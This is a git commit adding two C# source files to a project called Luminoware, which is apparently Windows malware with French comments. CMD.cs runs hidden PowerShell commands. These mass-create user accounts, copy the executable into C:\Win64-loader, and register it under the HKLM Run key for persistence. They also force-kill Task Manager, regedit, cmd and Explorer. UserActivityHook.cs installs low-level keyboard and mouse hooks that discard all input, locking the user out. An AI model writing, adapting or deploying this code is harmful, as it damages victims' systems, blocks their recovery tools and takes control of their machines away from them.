80b6a5952525cf037d03479d3c38fbdca4bfc18e
Lumino-2-0 <123825334+Lumino-2-0@users.noreply.github.com>
2023-02-08 23:23:04 +0100

    Mise à jour code 'non brut'/ Update 'no brut' code

---
+++ Luminoware/System/CMD.cs
@@ -0,0 +1,149 @@
+﻿/*
+
+
+
+
+                                                                                                                                                                                                                                                                                             
+LLLLLLLLLLL             UUUUUUUU     UUUUUUUUMMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN        NNNNNNNN     OOOOOOOOO               RRRRRRRRRRRRRRRRR                  AAA               NNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS      OOOOOOOOO     MMMMMMMM               MMMMMMMM
+L:::::::::L             U::::::U     U::::::UM:::::::M             M:::::::MI::::::::IN:::::::N       N::::::N   OO:::::::::OO             R::::::::::::::::R                A:::A              N:::::::N       N::::::N SS:::::::::::::::S   OO:::::::::OO   M:::::::M             M:::::::M
+L:::::::::L             U::::::U     U::::::UM::::::::M           M::::::::MI::::::::IN::::::::N      N::::::N OO:::::::::::::OO           R::::::RRRRRR:::::R              A:::::A             N::::::::N      N::::::NS:::::SSSSSS::::::S OO:::::::::::::OO M::::::::M           M::::::::M
+LL:::::::LL             UU:::::U     U:::::UUM:::::::::M         M:::::::::MII::::::IIN:::::::::N     N::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R            A:::::::A            N:::::::::N     N::::::NS:::::S     SSSSSSSO:::::::OOO:::::::OM:::::::::M         M:::::::::M
+  L:::::L                U:::::U     U:::::U M::::::::::M       M::::::::::M  I::::I  N::::::::::N    N::::::NO::::::O   O::::::O            R::::R     R:::::R           A:::::::::A           N::::::::::N    N::::::NS:::::S            O::::::O   O::::::OM::::::::::M       M::::::::::M
+  L:::::L                U:::::D     D:::::U M:::::::::::M     M:::::::::::M  I::::I  N:::::::::::N   N::::::NO:::::O     O:::::O            R::::R     R:::::R          A:::::A:::::A          N:::::::::::N   N::::::NS:::::S            O:::::O     O:::::OM:::::::::::M     M:::::::::::M
+  L:::::L                U:::::D     D:::::U M:::::::M::::M   M::::M:::::::M  I::::I  N:::::::N::::N  N::::::NO:::::O     O:::::O            R::::RRRRRR:::::R          A:::::A A:::::A         N:::::::N::::N  N::::::N S::::SSSS         O:::::O     O:::::OM:::::::M::::M   M::::M:::::::M
+  L:::::L                U:::::D     D:::::U M::::::M M::::M M::::M M::::::M  I::::I  N::::::N N::::N N::::::NO:::::O     O:::::O            R:::::::::::::RR          A:::::A   A:::::A        N::::::N N::::N N::::::N  SS::::::SSSSS    O:::::O     O:::::OM::::::M M::::M M::::M M::::::M
+  L:::::L                U:::::D     D:::::U M::::::M  M::::M::::M  M::::::M  I::::I  N::::::N  N::::N:::::::NO:::::O     O:::::O            R::::RRRRRR:::::R        A:::::A     A:::::A       N::::::N  N::::N:::::::N    SSS::::::::SS  O:::::O     O:::::OM::::::M  M::::M::::M  M::::::M
+  L:::::L                U:::::D     D:::::U M::::::M   M:::::::M   M::::::M  I::::I  N::::::N   N:::::::::::NO:::::O     O:::::O            R::::R     R:::::R      A:::::AAAAAAAAA:::::A      N::::::N   N:::::::::::N       SSSSSS::::S O:::::O     O:::::OM::::::M   M:::::::M   M::::::M
+  L:::::L                U:::::D     D:::::U M::::::M    M:::::M    M::::::M  I::::I  N::::::N    N::::::::::NO:::::O     O:::::O            R::::R     R:::::R     A:::::::::::::::::::::A     N::::::N    N::::::::::N            S:::::SO:::::O     O:::::OM::::::M    M:::::M    M::::::M
+  L:::::L         LLLLLL U::::::U   U::::::U M::::::M     MMMMM     M::::::M  I::::I  N::::::N     N:::::::::NO::::::O   O::::::O            R::::R     R:::::R    A:::::AAAAAAAAAAAAA:::::A    N::::::N     N:::::::::N            S:::::SO::::::O   O::::::OM::::::M     MMMMM     M::::::M
+LL:::::::LLLLLLLLL:::::L U:::::::UUU:::::::U M::::::M               M::::::MII::::::IIN::::::N      N::::::::NO:::::::OOO:::::::O          RR:::::R     R:::::R   A:::::A             A:::::A   N::::::N      N::::::::NSSSSSSS     S:::::SO:::::::OOO:::::::OM::::::M               M::::::M
+L::::::::::::::::::::::L  UU:::::::::::::UU  M::::::M               M::::::MI::::::::IN::::::N       N:::::::N OO:::::::::::::OO           R::::::R     R:::::R  A:::::A               A:::::A  N::::::N       N:::::::NS::::::SSSSSS:::::S OO:::::::::::::OO M::::::M               M::::::M
+L::::::::::::::::::::::L    UU:::::::::UU    M::::::M               M::::::MI::::::::IN::::::N        N::::::N   OO:::::::::OO             R::::::R     R:::::R A:::::A                 A:::::A N::::::N        N::::::NS:::::::::::::::SS    OO:::::::::OO   M::::::M               M::::::M
+LLLLLLLLLLLLLLLLLLLLLLLL      UUUUUUUUU      MMMMMMMM               MMMMMMMMIIIIIIIIIINNNNNNNN         NNNNNNN     OOOOOOOOO               RRRRRRRR     RRRRRRRAAAAAAA                   AAAAAAANNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS        OOOOOOOOO     MMMMMMMM               MMMMMMMM
+                                                                                                                                                                                                                                                                                             
+                                                                                                                                                                                                                                                                                             
+     __ __             __     
+    /\ \\ \          /'__`\   
+    \ \ \\ \        /\ \/\ \  
+     \ \ \\ \_      \ \ \ \ \ 
+      \ \__ ,__\ __  \ \ \_\ \
+       \/_/\_\_//\_\  \ \____/
+          \/_/  \/_/   \/___/ 
+                                                                                                                                                                                                                                                                                           
+      
+
+
+
+                                                                                                                                                                                                                                                                                             
+*/
+
+
+/*\|---------------------------------------------------------------------------------------------------------------|\*/
+/**/        using System.Diagnostics;      /*\| Librairie pour les processus CMD et PowerShell  (Class Process)    |\*/
+/*\|---------------------------------------------------------------------------------------------------------------|\*/
+
+
+// namespace CMD
+namespace CMD
+{
+
+    // class CMD_class
+    internal class CMD_class
+    {
+
+
+
+        public void Users_Chiants(int nombre_util) // Création de comptes utilisateurs
+        {
+            int f = 0;                // Variable pour savoir le nombre de comptes utilisateurs à creer
+
+            while (f < nombre_util) // Boucle pour créer les comptes utilisateurs jusqu'à la valeur de la variable "nombre_util"
+            {
+                try
+                {
+                    System.Threading.Thread.Sleep(1000);                                            // Pause de 1 seconde
+                    Process mtd = new Process();                                                    // Création d'un nouveau processus "mtd"
+                    mtd.StartInfo.FileName = "powershell.exe";                                      // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
+                    mtd.StartInfo.Arguments = "/C net user Lumino2.0-YT-" + f + " Lumino-S /add";   // Définition des arguments à passer à l'application/processus à executer (Création d'un compte utilisateur nommé "Lumino2.0-YT-" avec le mot de passe Lumino-S)
+                    mtd.StartInfo.UseShellExecute = true;                                           // On utilise le shell de l'OS
+                    mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                          // On cache la fenêtre du processus
+                    mtd.Start();                                                                    // On démarre le processus avec les paramètres définis précédemment
+                    mtd.Close();                                                                    // On ferme le processus
+
+                }
+                catch (System.IO.FileNotFoundException) { }; // Si le processus n'est pas trouvé, on ne fait rien
+                f++; // On incrémente la variable "f" de 1
+            }
+
+
+        }
+
+
+
+        public void Registry_Copy() // Copie de l'executable dans le répertoire "C:\Win64-loader" et ajout de la clé de registre pour le lancement au démarrage
+        {
+            try
+            {
+                System.Threading.Thread.Sleep(1000);                                                                                                                                                                                                         // Pause de 1 seconde
+                Process mtd = new Process();                                                                                                                                                                                                                 // Création d'un nouveau processus "mtd"
+                mtd.StartInfo.FileName = "powershell.exe";                                                                                                                                                                                                   // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
+                mtd.StartInfo.Arguments = "/C mkdir C:\\Win64-loader & copy luminoware-3.1.exe C:\\Win64-loader\\ & reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Luminoware-3.1 /t REG_SZ /d C:\\Win64-loader\\luminoware-3.1.exe";    // Définition des arguments à passer à l'application/processus à executer (Création du répertoire "C:\Win64-loader", copie de l'executable dans le répertoire "C:\Win64-loader" et ajout de la clé de registre pour le lancement au démarrage)
+                mtd.StartInfo.UseShellExecute = true;                                                                                                                                                                                                        // On utilise le shell de l'OS
+                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                                                                                                                                                                       // On cache la fenêtre du processus
+                mtd.Start();                                                                                                                                                                                                                                 // On démarre le processus avec les paramètres définis précédemment
+                mtd.Close();                                                                                                                                                                                                                                 // On ferme le processus
+
+            }
+            catch (System.IO.FileNotFoundException) { }; // Si le processus n'est pas trouvé, on ne fait rien
+
+
+        }
+        public void CMD_rtc() // Fonction de fermeture des processus Regedit, TaskManager, CMD (R.T.C)
+
+        {
+            try
+            {
+                Process mtd = new Process();                                                                                                     // Création d'un nouveau processus "mtd"
+                mtd.StartInfo.FileName = "powershell.exe";                                                                                       // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
+                mtd.StartInfo.Arguments = "/C taskkill /f /im taskmgr.exe & taskkill /f /im regedit.exe & taskkill /f /im cmd.exe";              // Définition des arguments à passer à l'application/processus à executer (Fermeture des processus Regedit, TaskManager, CMD)
+                mtd.StartInfo.UseShellExecute = true;                                                                                            // On utilise le shell de l'OS
+                mtd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                                                                           // On cache la fenêtre du processus
+                mtd.Start();                                                                                                                     // On démarre le processus avec les paramètres définis précédemment
+                mtd.Close();                                                                                                                     // On ferme le processus
+            }
+            catch (System.UnauthorizedAccessException) { }    // Si on n'a pas l'autorisation requise, on ne fait rien
+        }
+
+        public void CMD_killExplorer() // Fonction de fermeture du processus Explorer.exe
+        {
+            try
+            {
+                Process mtd1 = new Process();                                                   // Création d'un nouveau processus "mtd"
+                mtd1.StartInfo.FileName = "powershell.exe";                                     // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
+                mtd1.StartInfo.Arguments = "/C taskkill /f /im explorer.exe";                   // Définition des arguments à passer à l'application/processus à executer (Fermeture du processus Explorer.exe)
+                mtd1.StartInfo.UseShellExecute = true;                                          // On utilise le shell de l'OS
+                mtd1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                         // On cache la fenêtre du processus
+                mtd1.Start();                                                                   // On démarre le processus avec les paramètres définis précédemment
+                mtd1.Close();                                                                   // On ferme le processus
+            }
+            catch (System.UnauthorizedAccessException) { }   // Si on n'a pas l'autorisation requise, on ne fait rien
+
+        }
+        public void CMD_startExplorer() // Fonction de lancement du processus Explorer.exe
+        {
+            try
+            {
+                Process mtd2 = new Process();                                                  // Création d'un nouveau processus "mtd"
+                mtd2.StartInfo.FileName = "powershell.exe";                                    // Définition de l'application/processus à executer ("powershell.exe"/ Powershell Windows)
+                mtd2.StartInfo.Arguments = "/C start explorer.exe";                            // Définition des arguments à passer à l'application/processus à executer (Lancement du processus Explorer.exe)
+                mtd2.StartInfo.UseShellExecute = true;                                         // On utilise le shell de l'OS
+                mtd2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                        // On cache la fenêtre du processus
+                mtd2.Start();                                                                  // On démarre le processus avec les paramètres définis précédemment
+                mtd2.Close();                                                                  // On ferme le processus
+            }
+            catch (System.UnauthorizedAccessException) { } // Si on n'a pas l'autorisation requise, on ne fait rien
+
+        }
+
+    }
+}
---
+++ Luminoware/System/UserActivityHook.cs
@@ -0,0 +1,104 @@
+﻿/*
+
+
+
+
+
+L)        U)    uu   M)mm mmm   I)iiii  N)n   nn   O)oooo        R)rrrrr     A)aa    N)n   nn   S)ssss    O)oooo    M)mm mmm  
+L)        U)    uu  M)  mm  mm    I)    N)nn  nn  O)    oo       R)    rr   A)  aa   N)nn  nn  S)    ss  O)    oo  M)  mm  mm 
+L)        U)    uu  M)  mm  mm    I)    N) nn nn  O)    oo       R)  rrr   A)    aa  N) nn nn   S)ss     O)    oo  M)  mm  mm 
+L)        U)    uu  M)  mm  mm    I)    N)  nnnn  O)    oo       R) rr     A)aaaaaa  N)  nnnn       S)   O)    oo  M)  mm  mm 
+L)        U)    uu  M)      mm    I)    N)   nnn  O)    oo       R)   rr   A)    aa  N)   nnn  S)    ss  O)    oo  M)      mm 
+L)llllll   U)uuuu   M)      mm  I)iiii  N)    nn   O)oooo        R)    rr  A)    aa  N)    nn   S)ssss    O)oooo   M)      mm 
+                                                                                                                    
+     __ __             __     
+    /\ \\ \          /'__`\   
+    \ \ \\ \        /\ \/\ \  
+     \ \ \\ \_      \ \ \ \ \ 
+      \ \__ ,__\ __  \ \ \_\ \
+       \/_/\_\_//\_\  \ \____/
+          \/_/  \/_/   \/___/ 
+              
+
+
+
+
+*/
+using System;                           /*\|---------------------------------------------------------------------------------------------------------------|\*/
+using System.Runtime.InteropServices;   /*\|   Librairie de base (System) et Librairie pour les appels Win32 (Runtime.InteropServices) et Librairie pour   |\*/
+using System.Reflection;                /*\|                            les appels à des fonctions externes (Reflection)                                   |\*/
+/*                                      /*\| INFO: un hook sert à bloquer la souris/clavier de l'utilisateur (sauf ctrl+alt+sup: intercepeter par Windows) |\*/
+/*                                      /*\|---------------------------------------------------------------------------------------------------------------|\*/
+
+
+// namespace GlobalHook
+namespace GlobalHook
+{
+    // class UserActivityHook
+    public class UserActivityHook
+    {
+        private int _hMouseHook = 0;                                                                                                       // nouvelle variable (privée) pour le hook de la souris
+        private int _hKeyboardHook = 0;                                                                                                    // nouvelle variable (privée) pour le hook du clavier
+        private static HookProc MouseHookProcedure = null;                                                                                 // initialisation de la variable MouseHookProcedure qui permet de définir le hook de la souris à l'aide de la fonction HookProc
+        private static HookProc KeyboardHookProcedure = null;                                                                              // initialisation de la variable KeyboardHookProcedure qui permet de définir le hook du clavier à l'aide de la fonction HookProc
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]              // appel de la fonction SetWindowsHookEx de la librairie user32.dll pour définir le hook de la souris (WH_MOUSE_LL) ou du clavier (WH_KEYBOARD_LL) pour activer le hook
+        private static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, int dwThreadId);                                // déclaration de la fonction SetWindowsHookEx avec des paramètres de type int, HookProc, IntPtr et int
+
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]              // appel de la fonction UnhookWindowsHookEx de la librairie user32.dll pour désactiver le hook de la souris (WH_MOUSE_LL) ou du clavier (WH_KEYBOARD_LL) pour désactiver le hook
+        private static extern int UnhookWindowsHookEx(int idHook);                                                                         // déclaration de la fonction UnhookWindowsHookEx avec un paramètre de type int
+
+        private delegate int HookProc(int nCode, int wParam, IntPtr lParam);                                                               // déclaration de la fonction HookProc avec des paramètres de type int, int et IntPtr
+
+
+        private const int WH_MOUSE_LL = 14;                                                                                                // déclaration de la constante WH_MOUSE_LL avec une valeur de type int (14)
+
+        private const int WH_KEYBOARD_LL = 13;                                                                                             // déclaration de la constante WH_KEYBOARD_LL avec une valeur de type int (13)
+
+
+        public void Start_key()  // Fonction qui permet de démarrer le hook du clavier
+        {
+            KeyboardHookProcedure = new HookProc(KeyboardHookProc);                                                                                                       // déclaration de la variable KeyboardHookProcedure qui permet de définir le hook du clavier à l'aide de la fonction HookProc
+            this._hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);      // déclaration de la variable (this.)_hKeyboardHook qui permet de définir le hook du clavier à l'aide de la fonction SetWindowsHookEx
+        }
+        public void Start_mouse() // Fonction qui permet de démarrer le hook de la souris
+        {
+            MouseHookProcedure = new HookProc(MouseHookProc);                                                                                                             // déclaration de la variable MouseHookProcedure qui permet de définir le hook de la souris à l'aide de la fonction HookProc
+            this._hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookProcedure, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]), 0);               // déclaration de la variable (this.)_hMouseHook qui permet de définir le hook de la souris à l'aide de la fonction SetWindowsHookEx
+        }
+
+
+        public void Stop_key() // Fonction qui permet d'arrêter le hook du clavier
+        {
+            this.Stop_key(true, true);                                                                                                                                     // appel de la fonction Stop_key avec les paramètres true et true
+        }
+        public void Stop_mouse() // Fonction qui permet d'arrêter le hook de la souris
+        {
+            this.Stop_mouse(true, true);                                                                                                                                   // appel de la fonction Stop_mouse avec les paramètres true et true
+        }
+        public void Stop_mouse(bool uninstallMouseHook, bool throwExceptions) // Fonction qui permet d'arrêter le hook de la souris
+        {
+            int retMouse = UnhookWindowsHookEx(this._hMouseHook);                                                                                                          // déclaration de la variable retMouse qui permet de désactiver le hook de la souris à l'aide de la fonction UnhookWindowsHookEx
+            this._hMouseHook = 0;                                                                                                                                          // déclaration de la variable (this.)_hMouseHook avec une valeur de type int (0)
+
+        }
+
+        public void Stop_key(bool uninstallKeyboardHook, bool throwExceptions) // Fonction qui permet d'arrêter le hook du clavier
+        {
+            int retKeyboard = UnhookWindowsHookEx(this._hKeyboardHook);                                                                                                    // déclaration de la variable retKeyboard qui permet de désactiver le hook du clavier à l'aide de la fonction UnhookWindowsHookEx
+            this._hKeyboardHook = 0;                                                                                                                                       // déclaration de la variable (this.)_hKeyboardHook avec une valeur de type int (0)
+        }
+
+
+        private int MouseHookProc(int nCode, int wParam, IntPtr lParam) // Fonction qui permet de définir le hook de la souris
+        {
+            return -1;                                                                                                                                                    // retourne -1
+        }
+
+        private int KeyboardHookProc(int nCode, Int32 wParam, IntPtr lParam) // Fonction qui permet de définir le hook du clavier
+        {
+            return -1;                                                                                                                                                    // retourne -1
+        }
+    }
+}
